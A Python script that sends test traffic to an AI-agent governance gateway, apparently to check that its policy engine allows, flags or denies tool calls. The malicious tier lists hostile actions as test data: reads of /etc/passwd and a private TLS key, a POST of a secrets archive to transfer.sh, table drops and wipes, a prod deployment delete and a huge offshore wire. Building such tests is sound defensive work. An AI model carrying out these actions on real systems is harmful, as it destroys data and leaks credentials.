#!/usr/bin/env python3
"""
Real Traffic Generator — produces genuine ACP governance decisions (no seeded data).

Unlike seed_demo_data.py which backfills fake rows, this script makes actual
POST /execute calls against the running ACP gateway.  Every decision is real:
governed by OPA, scored by the behavior engine, and written to the tamper-evident
audit chain.

Usage:
    # Against local stack (docker-compose up):
    python scripts/generate_real_traffic.py --host http://localhost:8000 --rounds 5

    # Against production:
    python scripts/generate_real_traffic.py \
        --host https://aegisagent.in \
        --token <JWT> \
        --rounds 20 \
        --concurrency 4

    # Quiet mode (no per-decision output — just final stats):
    python scripts/generate_real_traffic.py --quiet
"""

from __future__ import annotations

import argparse
import base64
import json
import os
import random
import sys
import time
import uuid
from collections import Counter
from concurrent.futures import ThreadPoolExecutor, as_completed

import httpx

# ── Config ────────────────────────────────────────────────────────────────────

DEFAULT_HOST      = os.environ.get("ACP_GATEWAY_URL", "http://localhost:8000")
DEFAULT_TENANT_ID = os.environ.get("ACP_TENANT_ID",   "00000000-0000-0000-0000-000000000001")
DEFAULT_AGENT_ID  = os.environ.get("ACP_AGENT_ID",    "11111111-1111-1111-1111-111111111111")

# ── Traffic mix ───────────────────────────────────────────────────────────────
# Realistic enterprise workload mirrors real customer behaviour: 95% boring
# day-to-day activity, 4% suspicious-but-legitimate, 1% genuinely malicious.
# The "tier" field drives the random.choices weights below — each individual
# `weight` field is preserved so that within a tier the distribution of
# scenarios is still relatively balanced.

TRAFFIC_MIX: list[dict] = [
    # ── Normal (95%) ──────────────────────────────────────────────────────────
    # Read-only SELECTs, harmless API GETs, small/expected writes, dev-env
    # kubectl, status checks, internal LLM proxy calls. Should ALLOW.
    {"tool": "run_sql",      "params": {"query": "SELECT count(*) FROM audit_logs WHERE created_at > now() - interval '1 hour'"}, "label": "normal_sql_count",    "tier": "normal", "weight": 10},
    {"tool": "run_sql",      "params": {"query": "SELECT id, email FROM users WHERE id = 42 LIMIT 1"},                            "label": "normal_sql_lookup",   "tier": "normal", "weight": 10},
    {"tool": "run_sql",      "params": {"query": "SELECT status, COUNT(*) FROM orders GROUP BY status"},                          "label": "normal_sql_agg",      "tier": "normal", "weight": 8},
    {"tool": "run_sql",      "params": {"query": "SELECT name FROM products WHERE sku = 'SKU-12345' LIMIT 1"},                    "label": "normal_sql_sku",      "tier": "normal", "weight": 8},
    {"tool": "read_file",    "params": {"path": "/data/reports/q1_summary.csv"},                                                  "label": "normal_read_report",  "tier": "normal", "weight": 8},
    {"tool": "read_file",    "params": {"path": "/app/config/settings.json"},                                                     "label": "normal_read_config",  "tier": "normal", "weight": 8},
    {"tool": "list_dir",     "params": {"path": "/data/reports"},                                                                 "label": "normal_list_dir",     "tier": "normal", "weight": 6},
    {"tool": "http_request", "params": {"url": "https://api.github.com/repos/acme/svc/releases/latest", "method": "GET"},         "label": "normal_http_github",  "tier": "normal", "weight": 6},
    {"tool": "http_request", "params": {"url": "https://api.stripe.com/v1/charges/ch_abc/", "method": "GET"},                     "label": "normal_http_stripe",  "tier": "normal", "weight": 5},
    {"tool": "http_request", "params": {"url": "https://status.aws.amazon.com/", "method": "GET"},                                "label": "normal_http_status",  "tier": "normal", "weight": 5},
    {"tool": "send_email",   "params": {"to": "team@company.com", "subject": "Daily report", "body": "Build #4821 passed"},       "label": "normal_email",        "tier": "normal", "weight": 6},
    {"tool": "wire_transfer","params": {"recipient": "internal_payroll", "amount_usd": 4250, "recipient_kind": "internal"},       "label": "normal_small_wire",   "tier": "normal", "weight": 5},
    {"tool": "kubectl",      "params": {"verb": "get", "resource": "pods", "namespace": "dev"},                                   "label": "normal_kubectl_dev",  "tier": "normal", "weight": 6},
    {"tool": "kubectl",      "params": {"verb": "logs", "resource": "deploy/api", "namespace": "staging"},                        "label": "normal_kubectl_logs","tier": "normal", "weight": 4},
    {"tool": "llm_proxy",    "params": {"model": "claude-haiku-4.5", "prompt": "Summarize this PR description.", "max_tokens": 256}, "label": "normal_llm_small",  "tier": "normal", "weight": 5},

    # ── Suspicious (4%) ───────────────────────────────────────────────────────
    # Legitimate-looking but trips a finding — MONITOR or ESCALATE expected.
    {"tool": "wire_transfer","params": {"recipient": "vendor_acme_llc", "amount_usd": 75000, "recipient_kind": "external"},       "label": "suspicious_medium_wire", "tier": "suspicious", "weight": 3},
    {"tool": "run_sql",      "params": {"query": "SELECT * FROM users LIMIT 100"},                                                "label": "suspicious_broad_select","tier": "suspicious", "weight": 3},
    {"tool": "kubectl",      "params": {"verb": "describe", "resource": "secret/db-creds", "namespace": "prod"},                  "label": "suspicious_kubectl_prod","tier": "suspicious", "weight": 2},
    {"tool": "run_sql",      "params": {"query": "SELECT patient_id, dob, diagnosis FROM patients LIMIT 50"},                     "label": "suspicious_patient_lookup","tier":"suspicious","weight": 2},
    {"tool": "http_request", "params": {"url": "https://internal.company.com/api/keys", "method": "GET"},                         "label": "suspicious_internal_keys","tier": "suspicious", "weight": 2},

    # ── Malicious (1%) ────────────────────────────────────────────────────────
    # Existing dangerous scenarios — should DENY.
    {"tool": "run_sql",      "params": {"query": "DROP TABLE temp_sessions"},                                                     "label": "malicious_sql_ddl",    "tier": "malicious", "weight": 1},
    {"tool": "read_file",    "params": {"path": "/etc/passwd"},                                                                   "label": "malicious_path_trav",  "tier": "malicious", "weight": 1},
    {"tool": "wire_transfer","params": {"recipient": "unknown_offshore_acct", "amount_usd": 25000000, "recipient_kind": "external"}, "label": "malicious_huge_wire","tier": "malicious", "weight": 1},
    {"tool": "kubectl",      "params": {"verb": "delete", "resource": "deploy/api", "namespace": "prod"},                         "label": "malicious_kubectl_del","tier": "malicious", "weight": 1},
    {"tool": "http_request", "params": {"url": "https://transfer.sh/secrets.tar.gz", "method": "POST"},                           "label": "malicious_exfil",      "tier": "malicious", "weight": 1},
    {"tool": "read_file",    "params": {"path": "/etc/ssl/private/server.key"},                                                   "label": "malicious_key_read",   "tier": "malicious", "weight": 1},
    {"tool": "run_sql",      "params": {"query": "DELETE FROM users WHERE id > 0"},                                               "label": "malicious_sql_wipe",   "tier": "malicious", "weight": 1},
]

# Target tier ratios (95 / 4 / 1).
_TIER_RATIOS = {"normal": 0.95, "suspicious": 0.04, "malicious": 0.01}

# Per-entry weights honour BOTH the tier ratio AND the in-tier `weight` balance.
_TIER_TOTAL_WEIGHT = Counter()
for _e in TRAFFIC_MIX:
    _TIER_TOTAL_WEIGHT[_e["tier"]] += _e["weight"]
_TOOLS_POPULATION: list[dict] = list(TRAFFIC_MIX)
_TOOLS_WEIGHTS: list[float] = [
    _TIER_RATIOS[e["tier"]] * (e["weight"] / (_TIER_TOTAL_WEIGHT[e["tier"]] or 1))
    for e in _TOOLS_POPULATION
]


# ── Auth helpers ──────────────────────────────────────────────────────────────

def _extract_tenant_from_jwt(token: str) -> str:
    try:
        part = token.split(".")[1]
        part += "=" * (-len(part) % 4)
        return json.loads(base64.urlsafe_b64decode(part)).get("tenant_id", "")
    except Exception:
        return ""


def _get_token(host: str, email: str, password: str, tenant_id: str) -> tuple[str, str] | None:
    try:
        r = httpx.post(
            f"{host}/auth/token",
            json={"email": email, "password": password},
            headers={"X-Tenant-ID": tenant_id},
            timeout=10.0,
        )
        if r.status_code == 200:
            d = r.json().get("data", {})
            tok = d.get("access_token", "")
            tid = d.get("tenant_id", tenant_id)
            return tok, tid
    except Exception as e:
        print(f"[auth] token generation failed: {e}", file=sys.stderr)
    return None


# ── Core execute call ─────────────────────────────────────────────────────────

def execute_one(host: str, token: str, tenant_id: str, agent_id: str, entry: dict, quiet: bool) -> dict:
    request_id = str(uuid.uuid4())
    headers = {
        "Authorization":  f"Bearer {token}",
        "X-Tenant-ID":    tenant_id,
        "X-Agent-ID":     agent_id,
        "X-Request-ID":   request_id,
        "Content-Type":   "application/json",
    }
    payload = {
        "agent_id":   agent_id,
        "tool_name":  entry["tool"],
        "parameters": entry["params"],
        "context":    {"label": entry["label"], "generated_by": "generate_real_traffic.py"},
    }
    try:
        r = httpx.post(f"{host}/execute", headers=headers, json=payload, timeout=15.0)
        status = r.status_code
        body = r.json() if r.headers.get("content-type", "").startswith("application/json") else {}
        action = body.get("action") or body.get("data", {}).get("action") or ("blocked" if status == 403 else "unknown")
        risk   = body.get("risk_score") or body.get("data", {}).get("risk_score") or 0.0
        result = {"tool": entry["tool"], "label": entry["label"], "status": status, "action": action, "risk": risk, "request_id": request_id}
        if not quiet:
            icon = "✅" if action in ("allow", "allowed") else "🚫" if action in ("deny", "block", "blocked", "policy_deny") else "⚠️"
            print(f"  {icon}  {entry['tool']:<18}  {action:<14}  risk={float(risk):.2f}  [{status}]")
        return result
    except Exception as exc:
        if not quiet:
            print(f"  ❌  {entry['tool']:<18}  error: {exc}")
        return {"tool": entry["tool"], "label": entry["label"], "status": 0, "action": "error", "risk": 0.0, "error": str(exc)}


# ── Main ──────────────────────────────────────────────────────────────────────

def main() -> None:
    ap = argparse.ArgumentParser(description="Generate real ACP governance traffic")
    ap.add_argument("--host",        default=DEFAULT_HOST,      help="ACP gateway URL")
    ap.add_argument("--token",       default="",                help="JWT (skips auto-login)")
    ap.add_argument("--email",       default="admin@acp.local", help="Login email for auto-login")
    ap.add_argument("--password",    default="password",        help="Login password for auto-login")
    ap.add_argument("--tenant-id",   default=DEFAULT_TENANT_ID, help="Tenant UUID")
    ap.add_argument("--agent-id",    default=DEFAULT_AGENT_ID,  help="Agent UUID")
    ap.add_argument("--rounds",      type=int, default=3,       help="Number of full traffic rounds")
    ap.add_argument("--concurrency", type=int, default=2,       help="Parallel workers")
    ap.add_argument("--delay",       type=float, default=0.3,   help="Delay between rounds (seconds)")
    ap.add_argument("--quiet",       action="store_true",       help="Suppress per-decision output")
    ap.add_argument("--seed", type=int, default=None,           help="Random seed for reproducibility")
    args = ap.parse_args()

    if args.seed is not None:
        random.seed(args.seed)

    host      = args.host.rstrip("/")
    token     = args.token
    tenant_id = args.tenant_id
    agent_id  = args.agent_id

    # Built before auth so operators see the planned mix even on dry runs.
    total_calls = args.rounds * len(TRAFFIC_MIX)
    calls: list[dict] = random.choices(
        _TOOLS_POPULATION, weights=_TOOLS_WEIGHTS, k=total_calls
    )
    random.shuffle(calls)

    planned = Counter(c["tier"] for c in calls)
    print(
        f"[mix] planned: {planned['normal']} normal, "
        f"{planned['suspicious']} suspicious, "
        f"{planned['malicious']} malicious "
        f"(total {len(calls)})"
    )

    # Auto-login if no token provided
    if not token:
        if not args.quiet:
            print(f"[auth] logging in as {args.email} …")
        result = _get_token(host, args.email, args.password, tenant_id)
        if not result:
            print("ERROR: could not obtain auth token. Pass --token or check credentials.", file=sys.stderr)
            sys.exit(1)
        token, tenant_id = result
        if not args.quiet:
            print(f"[auth] ✓ token obtained (tenant={tenant_id})")
    else:
        extracted = _extract_tenant_from_jwt(token)
        if extracted:
            tenant_id = extracted

    if not args.quiet:
        print(f"\n{'='*60}")
        print("Aegis Real Traffic Generator")
        print(f"Host:    {host}")
        print(f"Tenant:  {tenant_id}")
        print(f"Agent:   {agent_id}")
        print(f"Rounds:  {args.rounds} × {len(TRAFFIC_MIX)} calls = {args.rounds * len(TRAFFIC_MIX)} total")
        print(f"Workers: {args.concurrency}")
        print(f"{'='*60}\n")

    # Execute
    start = time.time()
    results: list[dict] = []

    with ThreadPoolExecutor(max_workers=args.concurrency) as pool:
        futures = [
            pool.submit(execute_one, host, token, tenant_id, agent_id, call, args.quiet)
            for call in calls
        ]
        for i, fut in enumerate(as_completed(futures), 1):
            results.append(fut.result())
            if not args.quiet and i % 10 == 0:
                print(f"  … {i}/{len(calls)} completed")
            if args.delay > 0 and i % args.concurrency == 0:
                time.sleep(args.delay)

    elapsed = time.time() - start

    # Stats
    total    = len(results)
    allowed  = sum(1 for r in results if r["action"] in ("allow", "allowed"))
    blocked  = sum(1 for r in results if r["action"] in ("deny", "block", "blocked", "policy_deny"))
    errors   = sum(1 for r in results if r["action"] == "error")
    other    = total - allowed - blocked - errors
    avg_risk = sum(float(r.get("risk", 0)) for r in results) / max(total, 1)

    print(f"\n{'─'*60}")
    print(f"Results ({elapsed:.1f}s, {total / max(elapsed, 0.001):.1f} req/s):")
    print(f"  Total decisions : {total}")
    print(f"  Allowed         : {allowed}  ({100 * allowed / max(total, 1):.0f}%)")
    print(f"  Blocked         : {blocked}  ({100 * blocked / max(total, 1):.0f}%)")
    print(f"  Other           : {other}")
    print(f"  Errors          : {errors}")
    print(f"  Avg risk score  : {avg_risk:.3f}")
    print(f"{'─'*60}")
    print("  All decisions are live in the audit trail.")
    print(f"  View at: {host}/observability")
    print()

    if errors > 0:
        sys.exit(1)


if __name__ == "__main__":
    main()
